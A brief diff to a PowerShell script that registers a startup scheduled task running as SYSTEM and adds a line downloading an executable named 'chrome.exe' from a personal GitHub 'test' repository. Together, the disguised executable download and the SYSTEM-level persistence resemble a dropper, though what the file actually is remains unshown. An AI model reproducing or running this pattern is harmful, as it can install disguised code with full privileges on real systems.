@@ -3,3 +3,6 @@ $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 Register-ScheduledTask -TaskName "MyStartupTask" -Action $Action -Trigger $Trigger -Principal $Principal
+
+
+Invoke-WebRequest -Uri "https://github.com/Yak0vkaSup/test/raw/main/chrome.exe" -OutFile "C:\path\to\save\chrome.exe"
